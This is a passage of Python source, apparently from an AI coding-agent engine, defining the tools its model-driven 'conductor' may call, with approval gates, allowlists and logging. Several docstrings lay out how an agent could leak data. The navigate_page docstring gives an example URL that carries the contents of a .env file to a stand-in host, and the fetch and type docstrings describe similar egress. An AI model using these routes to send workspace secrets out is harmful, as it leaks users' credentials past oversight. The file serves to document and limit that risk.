"""The conductor's tools: the moves and the reads it can make, each a door onto something the pipeline already does.

A tool here is a thin caller of an existing capability (a read, a search, a stage, the write gate), never a new
capability: a skill or a model reply can sequence them and nothing more (docs/00 §6.9). `ExecutorService` owns
the state these act on and is named here only for its type.
"""

from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any, cast

from engine.ask import AskRefused, parse_question
from engine.conductor import EndTurn
from engine.executor_support import (
    AgentOutputInvalid,
    CriticRejection,
    TestsFailed,
    WriteWithdrawn,
    _verifier_outcome,
)
from engine.fs import FileSystemService, PathEscapeError
from engine.library import LibraryService, format_command, format_read, format_search
from engine.models import Goal, PlanStep
from engine.providers import ProviderError
from engine.recall import (
    MAX_THREADS,
    format_recall,
    format_thread_recall,
    search as search_recall,
    search_threads,
)
from engine.sandbox import CommandNotAllowed, validate_argv
from engine.scan import list_profiles, run_scan
from engine.skills import SkillSet
from engine.surface_editor import (
    EditorEditResult,
    EditorOpenResult,
    EditorReadResult,
    format_edit,
    format_open,
)
from engine.surface_editor import format_read as format_editor_read
from engine.surface_machine import (
    MachineKeyResult,
    MachineReadResult,
    MachineResetResult,
    MachineRunResult,
    format_key,
    format_reset,
    format_run,
)
from engine.surface_machine import format_read as format_machine_read
from engine.surfaces import SurfaceRefused, SurfaceUnavailable
from engine.todo import MAX_MUTATIONS, TodoRefused
from engine.web_fetch import MAX_FETCHES_PER_RUN, MODE_OFF, FetchRefused, fetch, format_fetch
from engine.webview_bridge import BridgeUnavailable, format_action, format_navigation, format_page

if TYPE_CHECKING:
    from engine.executor import ExecutorService


#: What a page verb says when there is no page. One sentence, named, because a
#: missing browser is the *normal* answer in a benchmark, a CLI turn and most
#: of the suite — and a verb that raised there would fail every turn on every
#: machine that is not the desktop app.
_NO_BROWSER = (
    "There is no browser attached to this engine, so there is no page to act "
    "on. This is the normal answer outside the desktop app — a command-line "
    "engine, a benchmark and a headless test all have no page. Ask the user "
    "to open the page in Codify, or answer from the workspace."
)


#: What an editor tool says when there is no window to ask. One sentence, named, for the reason `_NO_BROWSER` is one: a
#: missing window is the *normal* answer in a benchmark, a command-line turn and most of the suite.
_NO_EDITOR = (
    "There is no editor attached to this engine, so there is nothing to look at or change. This is the normal answer "
    "outside the desktop app: a command-line engine, a benchmark and a headless test have no window. Answer from the "
    "workspace, or ask the person to open the file in Codify."
)


#: What a machine tool says when there is no window to ask: the same normal answer as for the editor, in the same shape.
_NO_MACHINE = (
    "There is no machine attached to this engine, so there is no shell to look at or type into. This is the normal answer "
    "outside the desktop app: a command-line engine, a benchmark and a headless test have no window. Answer from the "
    "workspace, or ask the person to open a machine in Codify."
)


@dataclass
class _Conducted:
    """What one conductor run produced, and whether it got somewhere worth keeping.

    The distinction this exists for: a conductor that *declined* to plan — it
    answered instead, having judged that no change was needed — has made a
    decision the engine should honour. A conductor that *failed* to plan — its
    model errored, or it spent its whole call budget and produced neither an
    answer worth having nor a plan — has not decided anything, and falling back
    to the engine's own sequence is strictly better than failing the turn.

    Those two look identical from the reply text alone, which is why they are
    modelled instead of inferred.
    """

    answer: str | None
    exhausted: bool
    planned: bool
    # The person cancelled while it ran. Neither an answer nor a failure: the turn is over,
    # and nothing this run produced may be published or allowed to move the goal's status.
    cancelled: bool = False
    # There was no conductor to run: the provider cannot call tools, or no model is chosen. That is the
    # documented degradation to the engine's own path (docs/09 §10.9), not a failure, and the log must not
    # say a model failed when none was ever called.
    unavailable: bool = False
    # The provider's own *code* (`provider_unreachable`, `rate_limited`) when its model failed under the run,
    # else None. A code and never its message: a pause shows it, and a provider's message is third-party text.
    failure_code: str | None = None
    # The question the conductor put to the person, as data (`engine/ask.py`), when it ended the run with
    # `ask_user`. The words are `answer`; this is what lets the window offer the options as choices.
    question: dict[str, Any] | None = None
    # The run changed the text in the person's open editor (`edit_editor`, unsaved). Not a plan and not a file, so a
    # turn that did only this is neither of the things `run_chat` otherwise tests for, and is still a turn that did
    # what was asked: it must not be told "no file was changed".
    buffer_edited: bool = False

    @property
    def finished(self) -> bool:
        if self.cancelled:
            return False
        if self.answer is None:
            return False
        if not self.answer.strip() and not self.planned:
            # A model that said nothing has not declined anything. An empty reply (a model that spent its
            # budget thinking, a context overflow, a server that answered `{}`) is not a decision to
            # honour, and publishing it as "(no answer)" made the turn look finished when nothing had
            # been said or done.
            return False
        if self.exhausted and not self.planned:
            return False
        return True

    def explanation(self) -> str:
        if self.answer is None:
            return "its model failed, so there is no answer and no plan"
        if not self.answer.strip():
            return "its model said nothing, so there is no answer and no plan"
        return "it used every call it was given without producing a plan"


# How much of one file's diff a move result shows the conductor. A diff is how it learns what the fixer
# actually did, and an unbounded one is how a turn runs out of context describing it.
_DIFF_EXCERPT_CHARS = 1500


@dataclass
class _StepState:
    """What one conductor run knows about one step, between the moves that act on it.

    Everything here is *derived from what the moves did in this run* and invalidated the moment it stops
    being true: a `write` changes the files, so an earlier verdict and an earlier approval no longer describe
    them and both are cleared. It used to be a bare dict that the last `write` overwrote, which is how a
    second write replaced the first's files (the commit missed them, the critic reviewed half the change) and
    how an approval outlived the change it approved.
    """

    #: Latest summary per path, in first-written order. A step that is written twice has one entry per file,
    #: not one per write, so the verifier, the critic and the commit all see the whole change.
    files: dict[str, dict[str, Any]] = field(default_factory=dict)
    #: The verifier's outcome for the files as they are now, or None when nothing has verified them.
    test: dict[str, Any] | None = None
    #: The last verification failed. A step in this state is not reviewable.
    test_failed: bool = False
    #: The critic approved the files as they are now.
    reviewed: bool = False

    def summaries(self) -> list[dict[str, Any]]:
        return list(self.files.values())

    def wrote(self, written: list[dict[str, Any]]) -> None:
        for entry in written:
            path = str(entry.get("path"))
            earlier = self.files.get(path)
            # A proposal that matches what is already there says nothing changed *this time*, which must not
            # erase the diff of the write that did change the file.
            if earlier is not None and earlier.get("changed", True) and not entry.get("changed", True):
                continue
            self.files[path] = entry
        self.test = None
        self.test_failed = False
        self.reviewed = False


class ConductorTools:
    """The conductor's tools, each bound to the service the pipeline uses.

    This table *is* the conductor's authority, and it is deliberately made
    of the same calls the pipeline already makes — `LibraryService.read` is
    what serves the librarian's reads, `SandboxService.run_command` is what
    the verifier's argv goes through. So docs/00 §6.6 holds for a tool call
    exactly as it holds for a verifier: the model asks, `validate_argv`
    decides, and an unlisted command is refused however it was phrased.

    What replaced `delegate`: the seven stage moves below. `delegate` ran
    the whole recipe — librarian, design, planner — whether or not the
    request needed it, which made the sequence a property of the code rather
    than a decision of the decider. Each stage is now reachable on its own.

    What did *not* change is who is allowed to do what. `write` is the
    fixer's method under the fixer's validation and it refuses while the
    goal is unapproved (docs/00 §6.9); `verify` is the verifier's, so the
    command it proposes goes through `validate_argv` in `test` mode exactly
    as a step's own verification does (docs/00 §6.6). The conductor chooses
    *when* each runs. It cannot make any of them run without their checks.
    """

    #: Every name this table answers to, in the order the menu lists them. A tool
    #: cannot be defined and left out of the menu, and a name here cannot be a tool
    #: that does not exist — the table and the menu used to be two hand-maintained
    #: literals inside one function.
    NAMES: tuple[str, ...] = (
        'read_file',
        'search_code',
        'scan_code',
        'git_history',
        'run_command',
        'read_page',
        'navigate_page',
        'click_page',
        'type_page',
        'fetch_page',
        'read_editor',
        'open_in_editor',
        'edit_editor',
        'read_machine',
        'run_in_machine',
        'key_in_machine',
        'reset_machine',
        'recall',
        'recall_threads',
        'recon',
        'design',
        'plan',
        'write',
        'verify',
        'review',
        'summarize',
        'todo',
        'ask_user',
        'use_skill',
    )

    def __init__(
        self, service: ExecutorService, goal_id: str, goal: Goal, root: str, skills: SkillSet
    ) -> None:
        # A *named* method per tool, rather than a closure only
        # `_conductor_dispatch` could reach: that is what lets one be tested on
        # its own, and what makes the authority above readable in one place.
        # `service` is the pipeline that owns every call a tool makes.
        self.service = service
        self.goal_id = goal_id
        self.goal = goal
        self.root = root
        self.skills = skills
        # Resolved once, here, rather than in every tool that needs one.
        self.library = LibraryService(root)
        self.git = service.git
        self.ws = service.workspaces.get(goal.workspace_id)
        # `state` is what one move hands to the next inside a single conductor
        # run: the files a write produced, the verdict a verify returned. It is
        # keyed by step so a conductor working through three steps cannot mix
        # one step's diff into another's review.
        self.state: dict[str, _StepState] = {}
        # How many times this run has changed the todo list. A count of *this run*, so it lives here and not
        # on the goal: the list outlives the run, the limit on how much one run may fiddle with it does not.
        self.todo_edits = 0
        # How many pages this run has asked the web for, refused or not. Per run for the reason `todo_edits` is: the
        # limit is on how much one run may send out, and a refused attempt has already put its address in the log.
        self.fetches = 0

    def _state_of(self, step_id: str) -> _StepState:
        state = self.state.get(step_id)
        if state is None:
            state = self.state[step_id] = _StepState()
            self._recover_files(step_id, state)
        return state

    def _recover_files(self, step_id: str, state: _StepState) -> None:
        """The files an earlier run wrote for this step, from the diff events it published.

        A run is one conductor over one step, and a step can take more than one run: the budget ran out after
        `write`, the critic paused the goal, the provider died. Without this the next run found "nothing has
        been written for that step in this run" and had to write it again, and the fixer ran twice for one
        step. Only the *files* come back. A verdict and an approval describe the files as they were when they
        were given, and are never recovered: `verify` and `review` run again in the run that commits.
        """
        latest: dict[str, dict[str, Any]] = {}
        for event in self.service.goals.events_after(self.goal_id, 0):
            if event.type != "diff" or event.step_id != step_id:
                continue
            payload = event.payload or {}
            if payload.get("path"):
                latest[str(payload["path"])] = {
                    "path": str(payload["path"]),
                    "action": "written earlier",
                    "unified_diff": str(payload.get("unified_diff") or ""),
                    "changed": True,
                }
        state.files.update(latest)

    def step_for(self, step_id: str) -> PlanStep | str:
        """The step, or the sentence explaining which ids exist.

        Returning the refusal rather than raising it is the same rule the
        loop holds everywhere else: a model that passed a stale or invented
        id gets something it can act on, not a dead turn.
        """
        steps = self.service.goals.steps(self.goal_id)
        for candidate in steps:
            if candidate.id == step_id:
                return candidate
        if not steps:
            return (
                "There is no step with that id, because this goal has no "
                "steps yet. Call `plan` first (and `recon` before it if there "
                "is no evidence)."
            )
        listed = ", ".join(f"{s.id} ({s.title!r})" for s in steps)
        return f"There is no step called {step_id!r}. The steps are: {listed}"

    async def use_skill(self, args: dict[str, Any]) -> str:
        """One skill's instructions, or the menu if the name is wrong.

        The body is returned as a tool result and nowhere else. It is never
        executed or imported: a skill is text a model reads, so the worst a
        hostile one in a cloned repository can do is argue, and an argument
        cannot widen a tool.
        """
        name = str(args.get("name") or "").strip().lower()
        found = self.skills.get(name)
        if found is None:
            return (
                f"There is no skill called {name!r}. Available:\n{self.skills.menu()}"
            )
        self.service._log(self.goal_id, None, "info", f"conductor loaded the {found.name} skill")
        # The moves the skill is written around that are not on the menu right now, said before the model
        # tries one and is refused. Advisory and nothing more: this reads the menu, it never adds to it, and
        # only names of moves that exist are spoken of, so a header cannot put its own words in the engine's
        # note. A skill whose moves are all offered comes back exactly as written.
        offered = {t.name for t in self.service.conductor_menu(self.goal_id)()}
        missing = [m for m in found.moves if m in self.NAMES and m not in offered]
        if not missing:
            return found.body
        listed = ", ".join(f"`{m}`" for m in missing)
        return (
            f"{found.body}\n\n(Note from the engine: this skill is written around moves that are not on "
            f"your menu right now: {listed}. A call to one now will be refused; this note does not add them.)"
        )

    async def read_file(self, args: dict[str, Any]) -> str:
        return format_read(
            self.library.read(
                str(args.get("path") or ""),
                args.get("offset"),
                args.get("limit"),
            )
        )

    async def search_code(self, args: dict[str, Any]) -> str:
        # A search walks the whole workspace and can spawn ripgrep, so it is
        # off the event loop too — see `run_command` for why that matters.
        result = await asyncio.to_thread(
            self.library.search,
            str(args.get("query") or ""),
            glob=str(args["glob"]) if args.get("glob") else None,
            regex=bool(args.get("regex")),
            mode=str(args["mode"]) if args.get("mode") else None,
        )
        return format_search(result)

    async def scan_code(self, args: dict[str, Any]) -> str:
        """Curated review rules over the workspace: candidates with file and line, or the list of profiles.

        `search_code` with patterns somebody already wrote, so it is held to what `search_code` is: read-only,
        confined to this workspace, bounded, and honest about what it did not look at (`engine/scan.py`, `docs/13`).
        The patterns run in the regex worker, killed at a hard limit, because a profile can come from a cloned
        repository and its regexes are as untrusted as the model's. A hit is a line that matches and nothing more,
        and the result says so first. A profile is data and never a capability: it can add a rule, never a path to
        read, a command to run or a file to write.
        """
        profile = str(args.get("profile") or "").strip()
        if not profile:
            return await asyncio.to_thread(list_profiles, self.root)
        try:
            return await asyncio.to_thread(
                run_scan,
                self.root,
                profile=profile,
                glob=str(args.get("glob") or "").strip() or None,
                include_tests=bool(args.get("include_tests")),
                include_comments=bool(args.get("include_comments")),
            )
        except ValueError as exc:
            return f"That scan did not run: {exc}."

    async def git_history(self, args: dict[str, Any]) -> str:
        # `GitService.read_only` owns the subcommand allowlist. The
        # conductor's authority is that list, and it lives with the service
        # that runs git rather than in a table here that could drift from it.
        # A thread, because git is a subprocess: a `log` over a long history
        # used to hold the event loop behind it.
        return await asyncio.to_thread(self.git.read_only, self.root, args.get("args") or [])

    async def run_command(self, args: dict[str, Any]) -> str:
        argv = args.get("argv") or []
        if not isinstance(argv, list) or not all(isinstance(a, str) for a in argv):
            return "run_command takes a list of strings, e.g. [\"pytest\", \"-q\"]"
        reason = str(args.get("reason") or "").strip()
        argv = [str(a) for a in argv]
        # What the test allowlist admits is the repository's *own code*: `python3
        # evil.py`, `pytest` (which imports every conftest.py it finds), `npm run` of any
        # script, `cargo test`, `go test`. docs/03 §1.4 accepts that for a goal a person
        # has approved. A turn has no approval step, so until the goal is RUNNING this
        # tool is the librarian's: `ls`, `wc` and read-only git, which cannot execute
        # anything in the workspace. The gate is `write`'s own, and it reads the stored
        # status, so nothing the model says can move it.
        approved, _ = self.service._write_allowed(self.goal_id)
        if not approved:
            fs = FileSystemService(self.root)
            try:
                validate_argv(argv, fs, mode="read_only")
            except CommandNotAllowed as refusal:
                try:
                    validate_argv(argv, fs, mode="test")
                except CommandNotAllowed:
                    # Not a command any mode allows: the ordinary refusal, and it must
                    # not suggest that approval would change it.
                    raise refusal from None
                raise CommandNotAllowed(
                    f"`{argv[0]}` runs this project's own code, and this goal has no "
                    "approved plan: nothing in the repository runs until the user has "
                    "approved a plan by starting it. Until then only reading commands run "
                    "(ls, wc, git history). Say what you would run and why, propose the "
                    "change as a plan, and stop."
                ) from None
        # `mode="test"` once approved, the same mode the verifier's argv runs in. The
        # conductor is not the librarian, so it gets the test allowlist rather than the
        # read-only one — but it does not get a *wider* one.
        #
        # Off the event loop, and under the lock the verifier already takes.
        # This runs a real process for up to two minutes and it used to run it
        # *in* the loop: every WebSocket tick, /health probe and cancel request
        # queued behind the command, so watching a long test made the app
        # report itself offline. The lock is the other half of the same rule —
        # the sandbox is one shared workspace, so a concurrent step's test must
        # not run in the tree this command is measuring.
        # `to_thread` re-raises in the awaiter, so a refusal still arrives as
        # `CommandNotAllowed` — the behaviour this tool already had.
        async with self.service._sandbox_lock:
            result = await asyncio.to_thread(
                self.service.sandbox.run_command, self.root, argv,
                mode="test" if approved else "read_only",
                cancel=self.service.cancel_signal(self.goal_id),
            )
        return format_command(result) + (f"\n(reason given: {reason})" if reason else "")

    async def read_page(self, args: dict[str, Any]) -> str:
        """What the browser tab the user is looking at is showing.

        Read-only and outward-facing in the one sense that matters: it
        cannot navigate, cannot run anything and cannot reach the network
        from here. The page it reads is whatever the user put there — the
        model did not choose the URL and cannot change it — which is what
        makes this safe to offer to a role that reasons about untrusted
        text all day: the text arrives already labelled as a website's.

        A missing bridge is the normal case in a benchmark, a CLI turn and
        most of the test suite, so it is a sentence rather than an
        exception. An engine that raised here would fail every turn on
        every machine that is not the desktop app.
        """
        bridge = self.service.bridge
        if bridge is None:
            return (
                "There is no browser attached to this engine, so there is "
                "no page to read. This is the normal answer outside the "
                "desktop app — a command-line engine, a benchmark and a "
                "headless test have no page. Answer from the workspace, or "
                "ask the user to paste what they are looking at."
            )
        tab = str(args.get("tab") or "").strip() or None
        selector = str(args.get("selector") or "").strip() or None
        self.service._log(
            self.goal_id, None, "info",
            f"conductor read the page in {tab or 'the active browser tab'}",
        )
        try:
            page = await bridge.read_page(
                tab=tab, selector=selector, max_chars=args.get("max_chars")
            )
        except BridgeUnavailable as exc:
            return f"No page to read. {exc}"
        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
            return f"That page read did not come back. {exc}"
        return format_page(page)

    def _outside(self, path: str) -> str | None:
        """A sentence when `path` cannot be inside this workspace, else None.

        The same confinement every other file door uses (`FileSystemService.resolve`), asked before the round trip, so the
        model is told at once and the window is never asked to open somebody else's file. It only resolves: nothing is read.
        """
        try:
            FileSystemService(self.root).resolve(path)
        except PathEscapeError:
            return (
                f"{path!r} is outside this workspace, or is git's own metadata, so it cannot be shown in the editor. "
                "Paths are relative to the workspace root."
            )
        return None

    async def read_editor(self, args: dict[str, Any]) -> str:
        """What the person's editor holds: the open files, the cursor and selection, and a file's unsaved text.

        Eyes only. The text is the person's, including what they have not saved, which is the whole reason this exists
        beside `read_file`: the disk is exactly what they are not looking at while they type. It comes back as a quotation
        of their file, in a fixed shape, never as instructions.
        """
        surfaces = self.service.surfaces
        if surfaces is None:
            return _NO_EDITOR
        path = str(args.get("path") or "").strip() or None
        if path is not None and (refusal := self._outside(path)) is not None:
            return refusal
        self.service._log(
            self.goal_id, None, "info",
            f"conductor looked at the editor{f' ({path})' if path else ''}",
        )
        asked = {"path": path, "from_line": args.get("from_line"), "to_line": args.get("to_line")}
        try:
            result = await surfaces.ask("editor", "read", asked, workspace_id=self.goal.workspace_id)
        except SurfaceUnavailable as exc:
            return str(exc)
        except SurfaceRefused as exc:
            return f"That could not be read from the editor. {exc}"
        return format_editor_read(cast(EditorReadResult, result))

    async def open_in_editor(self, args: dict[str, Any]) -> str:
        """Show the person a file, and a line or range in it. Changes what they see and nothing on disk."""
        surfaces = self.service.surfaces
        if surfaces is None:
            return _NO_EDITOR
        path = str(args.get("path") or "").strip()
        if path and (refusal := self._outside(path)) is not None:
            return refusal
        self.service._log(self.goal_id, None, "info", f"conductor opened {path or '(no path)'} in the editor")
        asked = {"path": path, "line": args.get("line"), "end_line": args.get("end_line")}
        try:
            result = await surfaces.ask("editor", "open", asked, workspace_id=self.goal.workspace_id)
        except SurfaceUnavailable as exc:
            return f"That file was not opened. {exc}"
        except SurfaceRefused as exc:
            return f"That file was not opened. {exc}"
        return format_open(cast(EditorOpenResult, result))

    async def edit_editor(self, args: dict[str, Any]) -> str:
        """Change the text in an open buffer, and nothing else.

        **This never touches a file.** It asks the window to replace text in what the editor holds, as one undoable edit
        marked as the assistant's; the person's own Save is the only way that text reaches the disk (docs/00 §6.9), and no
        tool here can press it. So it carries none of the gates `write` does: there is nothing on disk for them to guard,
        and the person watching the buffer change is the approval. What it returns always says the change is unsaved.
        """
        surfaces = self.service.surfaces
        if surfaces is None:
            return _NO_EDITOR
        path = str(args.get("path") or "").strip()
        if path and (refusal := self._outside(path)) is not None:
            return refusal
        self.service._log(self.goal_id, None, "info", f"conductor edited {path or '(no path)'} in the editor")
        asked = {
            "path": path,
            "old_text": args.get("old_text"),
            "new_text": args.get("new_text"),
            "count": 1 if args.get("count") is None else args.get("count"),
        }
        try:
            result = await surfaces.ask("editor", "edit", asked, workspace_id=self.goal.workspace_id)
        except SurfaceUnavailable as exc:
            return f"That edit was not made. {exc}"
        except SurfaceRefused as exc:
            return f"That edit was not made. {exc}"
        edited = cast(EditorEditResult, result)
        if edited.replaced > 0:
            # Counted only when text really changed: a refusal, or an edit that matched nothing, is not a change the
            # person has to look at, and the turn must not be excused for it (`run_chat`'s "no file was changed").
            edits = self.service._editor_edits
            edits[self.goal_id] = edits.get(self.goal_id, 0) + 1
        return format_edit(edited)

    async def read_machine(self, args: dict[str, Any]) -> str:
        """What the person's machines show: which are open, and one screen with a tail of what scrolled off it.

        Eyes only. What comes back is program output, quoted and capped, in a fixed shape: never instructions.
        """
        surfaces = self.service.surfaces
        if surfaces is None:
            return _NO_MACHINE
        self.service._log(self.goal_id, None, "info", "conductor looked at the machine")
        asked = {"machine": args.get("machine"), "scrollback": 40 if args.get("scrollback") is None else args.get("scrollback")}
        try:
            result = await surfaces.ask("machine", "read", asked, workspace_id=self.goal.workspace_id)
        except SurfaceUnavailable as exc:
            return str(exc)
        except SurfaceRefused as exc:
            return f"That could not be read from the machine. {exc}"
        return format_machine_read(cast(MachineReadResult, result))

    async def run_in_machine(self, args: dict[str, Any]) -> str:
        """Type one command into the person's machine and bring back what it printed.

        **This is the one place a command runs without `validate_argv`**, on purpose and only because of where it runs: a
        jail whose view of the project is copy-on-write (the person's files are never written), holds no credentials, has
        no capabilities and has no network unless the person opened it with one (`src-tauri/src/machine.rs`, docs/00
        §6.6). It is never `SandboxService`, it cannot open a machine, and nothing it types reaches the person's files.
        So it carries none of the gates `run_command` does: the jail is the containment. The command is logged, capped, because this is the door with no allowlist and the log is
        how a person finds out what went through it.
        """
        surfaces = self.service.surfaces
        if surfaces is None:
            return _NO_MACHINE
        command = str(args.get("command") or "")
        self.service._log(self.goal_id, None, "info", f"conductor ran in the machine: {command[:200]!r}")
        asked = {"command": command, "machine": args.get("machine"), "wait_s": 5.0 if args.get("wait_s") is None else args.get("wait_s")}
        try:
            result = await surfaces.ask("machine", "run", asked, workspace_id=self.goal.workspace_id)
        except SurfaceUnavailable as exc:
            return f"That was not run. {exc}"
        except SurfaceRefused as exc:
            return f"That was not run in the machine. {exc}"
        return format_run(cast(MachineRunResult, result))

    async def key_in_machine(self, args: dict[str, Any]) -> str:
        """Press one named key in the person's machine, and say what the screen then reads."""
        surfaces = self.service.surfaces
        if surfaces is None:
            return _NO_MACHINE
        key = str(args.get("key") or "")
        self.service._log(self.goal_id, None, "info", f"conductor pressed {key[:20]!r} in the machine")
        asked = {"key": key, "machine": args.get("machine")}
        try:
            result = await surfaces.ask("machine", "key", asked, workspace_id=self.goal.workspace_id)
        except SurfaceUnavailable as exc:
            return f"That key was not pressed. {exc}"
        except SurfaceRefused as exc:
            return f"That key was not pressed in the machine. {exc}"
        return format_key(cast(MachineKeyResult, result))

    async def reset_machine(self, args: dict[str, Any]) -> str:
        """Throw away what the person's machine has done and start it again from a clean project.

        Recovery, and the only thing here that ends something the person may be using, so it is logged. It remakes the
        machine from the recipe it was opened with (the same project, the same network), so it cannot widen anything and
        cannot open a machine that is not there: the window refuses an id it does not hold.
        """
        surfaces = self.service.surfaces
        if surfaces is None:
            return _NO_MACHINE
        self.service._log(self.goal_id, None, "info", "conductor reset the machine")
        asked = {"machine": args.get("machine")}
        try:
            result = await surfaces.ask("machine", "reset", asked, workspace_id=self.goal.workspace_id)
        except SurfaceUnavailable as exc:
            return f"The machine was not reset. {exc}"
        except SurfaceRefused as exc:
            return f"The machine was not reset. {exc}"
        return format_reset(cast(MachineResetResult, result))

    async def recall(self, args: dict[str, Any]) -> str:
        """What this workspace has already learned the hard way.

        Read-only, and pointed at this workspace's own outcome history
        rather than at the web or at another project's rows. It cannot
        change anything: `RecallService` has no write path at all, so
        there is nothing here for a model to escalate into.

        Scoped by `goal.workspace_id` rather than by anything the model
        could influence. A user with two repositories open must not have
        one's failures recalled into the other's turns, and doing the
        filter in SQL rather than in Python means the other workspace's
        rows are never even read to decide that.
        """
        query = str(args.get("query") or "").strip()
        if not query:
            return (
                "recall needs something to look for — an error code, a "
                "message fragment, a path or a stage name."
            )
        days = args.get("days")
        rows = self.service.goals.recall_events(
            self.goal.workspace_id,
            window_days=int(days) if isinstance(days, int) else 0,
        )
        result = search_recall(rows, query, limit=int(args.get("limit") or 8))
        self.service._log(
            self.goal_id, None, "info",
            f"conductor recalled {result.get('matched', 0)} past event(s) "
            f"for {query[:120]!r}",
        )
        return format_recall(result)

    async def recall_threads(self, args: dict[str, Any]) -> str:
        """What earlier threads here were about, and how their runs ended.

        The thread-grain sibling of `recall`: that reads events inside
        runs, this reads the conversation history itself. Scoped by
        `goal.workspace_id` in the same way, for the same reason — another
        workspace's threads are never read to be discarded.
        """
        rows = self.service.goals.thread_recall(self.goal.workspace_id)
        result = search_threads(rows, args.get("query"), limit=int(args.get("limit") or MAX_THREADS))
        query = str(args.get("query") or "").strip()
        self.service._log(
            self.goal_id, None, "info",
            f"conductor recalled {result.get('count', 0)} thread(s)"
            + (f" matching {query[:120]!r}" if query else " (most recent)"),
        )
        return format_thread_recall(result)

    async def navigate_page(self, args: dict[str, Any]) -> str:
        """Move the user's tab somewhere the model picked.

        The one tool here that changes something the user can see, so it is
        worth being exact about where the authority is: the model proposes
        a URL and this engine does not decide whether it is allowed. The
        shell's `parse_navigation` does, in Rust, on the URL that arrives
        there — and it is the *same function* the user's own clicks go
        through, so a model-proposed address meets the guard rather than a
        copy of it. The redirect that follows is guarded again by
        `on_navigation`, exactly as it is for a person.

        What this cannot do is escalate the model's *authority*: the
        destination is another page in the same embedded webview, which
        holds no capability and cannot reach the engine.

        **What it does not prevent, and the guard above cannot.** The model
        can put anything it has read into the address it proposes, and
        `parse_navigation` admits any public http(s) URL — so
        `navigate_page("https://elsewhere.example/?d=<contents of .env>")`
        is a one-call way out of the machine for workspace contents, needing
        no approval, and leaving nothing in the transcript but the address.
        The guard decides *where* a navigation may go; nothing in this
        engine can decide whether the address is being used to carry data
        out, because the address is the payload. That is the thing to weigh
        before widening what a conductor turn may read.
        """
        bridge = self.service.bridge
        if bridge is None:
            return (
                "There is no browser attached to this engine, so there is "
                "no tab to move. This is the normal answer outside the "
                "desktop app. Give the user the address to open instead."
            )
        url = str(args.get("url") or "").strip()
        tab = str(args.get("tab") or "").strip() or None
        # Logged before the navigation, not after: this is the one tool
        # whose effect the user sees, and the transcript line is the only
        # place they will find out it happened.
        self.service._log(
            self.goal_id, None, "info",
            f"conductor moved {tab or 'the active browser tab'} to {url[:200]}",
        )
        try:
            moved = await bridge.navigate(url, tab=tab)
        except BridgeUnavailable as exc:
            return f"That navigation did not happen. {exc}"
        except Exception as exc:  # noqa: BLE001 — the guard's verdict is not our bug
            return f"That navigation did not happen. {exc}"
        return format_navigation(moved)

    async def click_page(self, args: dict[str, Any]) -> str:
        """Click what a selector names on the page the user is looking at.

        The second tool here that changes what someone can see, and the
        authority is the same as the navigation's: the model picks the
        element, the page performs the click, and every navigation that
        follows is met by the shell's own `parse_navigation` and by
        `on_navigation` — the same guard a person's own click goes
        through. As with `navigate_page`, this moves authority nowhere; the
        webview holds no capability and cannot reach the engine.

        It is also the second half of `type_page`, and the half that sends:
        a click on a submit control posts whatever a previous `type_page`
        put in a field, and the address it posts to is the page's choice,
        not this engine's. `type_page` alone was described as unable to
        submit anything, which was true of this tool's absence and is not
        true of the pair.
        """
        bridge = self.service.bridge
        if bridge is None:
            return _NO_BROWSER
        selector = str(args.get("selector") or "").strip()
        tab = str(args.get("tab") or "").strip() or None
        self.service._log(
            self.goal_id, None, "info",
            f"conductor clicked {selector!r} in {tab or 'the active browser tab'}",
        )
        try:
            done = await bridge.click(selector, tab=tab)
        except BridgeUnavailable as exc:
            return f"That click did not happen. {exc}"
        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
            return f"That click did not happen. {exc}"
        return format_action(done, "click")

    async def type_page(self, args: dict[str, Any]) -> str:
        """Put text into a field on the page the user is looking at.

        The narrowest of the four page verbs and the one with the most
        room to do damage, because it is the only one that writes. It is
        therefore also the one whose result says the least: the engine has
        not submitted anything, and what it typed may not have gone
        anywhere.

        "May not" rather than "has not", because a page sends on its own
        terms: a search box that queries on every keystroke is ordinary
        web behaviour, and this tool cannot see it happen. So typing a
        secret into a field a page watches is already an egress, and
        `click_page` on a submit control is the same act in one call.
        """
        bridge = self.service.bridge
        if bridge is None:
            return _NO_BROWSER
        selector = str(args.get("selector") or "").strip()
        text = str(args.get("text") or "")
        tab = str(args.get("tab") or "").strip() or None
        self.service._log(
            self.goal_id, None, "info",
            f"conductor typed {len(text)} character(s) into {selector!r} in "
            f"{tab or 'the active browser tab'}",
        )
        try:
            done = await bridge.type_text(selector, text, tab=tab)
        except BridgeUnavailable as exc:
            return f"That text was not typed. {exc}"
        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
            return f"That text was not typed. {exc}"
        return format_action(done, "type")

    async def fetch_page(self, args: dict[str, Any]) -> str:
        """Read one public web page the model named, under what the person allowed.

        The engine's own request, unlike the page verbs above, which ask the shell's webview: so the rules are
        `engine/web_fetch.py`'s, not a guard in another process, and they are those rules and no copy of them
        (policy, public addresses only, the connection pinned to the address that was checked, every redirect
        checked again, bounded in time and bytes). This method decides only whether to ask, and says so in
        the transcript first.

        **What it does not prevent.** The address is sent to the site, and a model that has read the workspace
        can put what it read in it. With the setting on, that is a way out of the machine that needs no
        approval, which is the same limit `navigate_page` documents; the list setting is what narrows it to
        sites a person named, and `MAX_FETCHES_PER_RUN` is what bounds how often. The page that comes back is
        a quotation, not instructions, and nothing in it reaches a tool, a path or argv.
        """
        policy = self.service._web_policy()
        if policy.mode == MODE_OFF:
            return (
                "Fetching web pages is turned off. The person can allow it in Settings; it is not something "
                "a conductor can change. Answer from the workspace, or give them the address to open."
            )
        url = str(args.get("url") or "").strip()
        if self.fetches >= MAX_FETCHES_PER_RUN:
            return (
                f"This run has already fetched {MAX_FETCHES_PER_RUN} pages, which is as many as one run may. "
                "Answer with what you have, and say what you did not get to."
            )
        self.fetches += 1
        # Logged before the request, not after: the address is the one thing that leaves the machine, and a
        # transcript line is the only place the person finds out it was asked for.
        self.service._log(self.goal_id, None, "info", f"conductor is fetching {url[:200]}")
        max_chars = args.get("max_chars")
        try:
            page = await fetch(
                url, policy,
                selector=str(args.get("selector") or "") or None,
                max_chars=max_chars if isinstance(max_chars, int) else None,
            )
        except FetchRefused as exc:
            return f"That page was not fetched: {exc}"
        return format_fetch(page)

        # ── the stage moves ────────────────────────────────────────────────
    async def recon(self, args: dict[str, Any]) -> str:
        task = str(args.get("task") or "").strip()
        if not task:
